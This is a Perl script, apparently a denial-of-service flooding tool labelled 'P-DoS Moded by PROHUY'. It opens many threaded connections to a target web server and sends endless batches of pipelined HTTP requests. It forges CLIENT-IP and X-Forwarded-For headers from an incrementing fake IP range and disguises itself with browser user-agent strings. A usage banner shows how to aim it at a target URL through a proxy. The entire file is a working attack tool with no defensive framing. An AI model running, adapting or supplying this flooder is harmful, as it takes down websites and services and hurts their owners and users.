#!/usr/bin/perl
package control;

my $ip;


sub new {
    my ($class,$i) = @_;
    $ip = $i;
    my $self={};
    $ip = $i;
    bless $self, $class;
    return $self;
}

sub mas {
my ($self,$veces) = @_;
$veces = 1 if($veces eq "");
my ($a,$e,$o,$b) = split(/\./,$ip);
for($as=0;$as<$veces;$as++) {
$b++;
if($b>=255) {$b=0;$o++;}
if($o>=255) {$o=0;$e++;}
if($e>=255) {$e=0;$a++;}
die("No mas IPs!\n") if($a>=255);
}
$ip = join "",$a,".",$e,".",$o,".",$b;
return $ip;
}

1;

package main;

use Socket;
use IO::Socket::INET;
use threads ('yield',
                'exit' => 'threads_only',
                'stringify');
use threads::shared;

my $ua = "Mozilla/5.0 (X11; DDoS Rekt Kid; rv:5.0) Gecko/20100101 Firefox/5.0";
my $ua = "Mozilla/4.0 (Compatible; MSIE 8.0; Windows NT 5.2; Trident/6.0)";
my $ua = "Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)";
my $ua = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; pl) Opera 11.00";
my $ua = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; en) Opera 11.00";
my $ua = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; ja) Opera 11.00";
my $ua = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; de) Opera 11.01";
my $ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36";
my $ua = "EmailWolf 1.00",
my $ua = "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14",
my $ua = "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0",
my $ua = "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3",
my $ua = "Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
my $ua = "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7",
my $ua = "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
my $ua = "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1",
my $method = "GET";
my $hilo;
my @vals = ('a','b','c','d','e','f','g','h','i','j','k','l','n','o','p','q','r','s','t','u','w','x','y','z',0,1,2,3,4,5,6,7,8,9);
my $randsemilla = "";
for($i = 0; $i < 30; $i++) {
    $randsemilla .= $vals[int(rand($#vals))];
}
sub socker {
    my ($remote,$port) = @_;
    my ($iaddr, $paddr, $proto);
    $iaddr = inet_aton($remote) || return false;
    $paddr = sockaddr_in($port, $iaddr) || return false;
    $proto = getprotobyname('tcp');
    socket(SOCK, PF_INET, SOCK_STREAM, $proto);
    connect(SOCK, $paddr) || return false;
    return SOCK;
}


sub sender {
    my ($max,$peerto,$host,$file) = @_;
    my $sock;
    while(true) {
        my $packet = "";
        $sock = IO::Socket::INET->new(PeerAddr => $host, PeerPort => $peerto, Proto => 'tcp');
        unless($sock) {
            print "\n[x] Unable to connect...\n\n";
            sleep(1);
            next;
        }
        for($i=0;$i<$porconexion;$i++) {
            $ipinicial = $sumador->mas();
            my $filepath = $file;
            $filepath =~ s/(\{mn\-fakeip\})/$ipinicial/g;
            $packet .= join "",$method," /",$filepath," HTTP/1.1\r\nHost: ",$host,"\r\nUser-Agent: ",$ua,"\r\nCLIENT-IP: ",$ipinicial,"\r\nX-Forwarded-For: ",$ipinicial,"\r\nIf-None-Match: ",$randsemilla,"\r\nIf-Modified-Since: Fri, 1 Dec 1969 23:00:00 GMT\r\nAccept: */*\r\nAccept-Language: es-es,es;q=0.8,en-us;q=0.5,en;q=0.3\r\nAccept-Encoding: gzip,deflate\r\nAccept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\nContent-Length: 0\r\nConnection: Keep-Alive\r\n\r\n";
        }
        $packet =~ s/Connection: Keep-Alive\r\n\r\n$/Connection: Close\r\n\r\n/;
        print $sock $packet;
    }
}

sub sender2 {
    my ($peerto,$host,$packet) = @_;
    my $sock;
    my $sumador :shared;
    while(true) {
        $sock = &socker($host,$peerto);
        unless($sock) {
            print "\n[x] Unable to connect...\n\n";
            next;
        }
        print $sock $packet;
    }
}


sub comenzar {
    $SIG{'KILL'} = sub { print "[!] Killed...\n"; threads->exit(); };
	# http.pl http://target.com 99999999 1000 50.246.120.125:8080 
    $url = $ARGV[0];                # URL
    $connection = $ARGV[1];         # Connection
    $threads_connection = $ARGV[2]; # Threads
	$method = $ARGV[3];             # Method
    $ipfake = $ARGV[4];             # Proxy
    if($threads_connection < 1) {
        print "[-] Invalid [url] [connection] [threads] [proxy]\n";
        exit;
    }
    if($url !~ /^http:\/\//) {
        $url .= "/" if($url =~ /^https?:\/\/([\d\w\:\.-]*)$/);;
		($host,$file) = ($url =~ /^https?:\/\/(.*?)\/(.*)/);
    } else {
		$url .= "/" if($url =~ /^http?:\/\/([\d\w\:\.-]*)$/);
		($host,$file) = ($url =~ /^http?:\/\/(.*?)\/(.*)/);
	}
	$puerto = 80;
    ($host,$puerto) = ($host =~ /(.*?):(.*)/) if($host =~ /(.*?):(.*)/);
    $file =~ s/\s/ /g;
    $file = "/".$file if($file !~ /^\//);
    print join "","[+] Target    : ",$host,":",$puerto,"\n";
	print join "","[+] Path      : ",$method," ",$file,"\n";
	print join "","[+] Proxy     : ",$ipfake,"\n";
	print join "","[+] Connection: ",$connection,"\n";
	print join "","[+] Threads   : ",$threads_connection,"\n\n";
    if($ipfake eq "") {
        my $paquetebase = join "",$method," ",$file," HTTP/1.1\r\nHost: ",$host,"\r\nUser-Agent: ",$ua,"\r\nIf-None-Match: ",$randsemilla,"\r\nAccept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip,deflate\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nContent-Length: 0\r\nConnection: Keep-Alive\r\n\r\n";
        $paquetesender = "";
        $paquetesender = $paquetebase x $threads_connection;
        $paquetesender =~ s/Connection: Keep-Alive\r\n\r\n$/Connection: Close\r\n\r\n/;
        for($v=0;$v<$connection;$v++) {
            $thr[$v] = threads->create('sender2', ($puerto,$host,$paquetesender));
        }
    } else {
        $sumador = control->new($ipfake);
        for($v=0;$v<$connection;$v++) {
            $thr[$v] = threads->create('sender', ($threads_connection,$puerto,$host,$file));
        }
    }
    print "[!] Loading...\n";
    for($v=0;$v<$connection;$v++) {
        if ($thr[$v]->is_running()) {
            sleep(3);
            $v--;
        }
    }
    print "[!] Finished!\n";
}

if($#ARGV > 3) {
    comenzar();
} else {
    print("
[+]---------------------------------------------------------------[+]
                   P-DoS  Moded by PROHUY                   
[+]---------------------------------------------------------------[+]
--> Use: pdos.pl [Url] [Connection] [Threads] [GET/POST/HEAD] [Proxy]
--> Ex : pdos.pl http://target.com 9999 1000 GET 82.137.250.145:8080\n");
}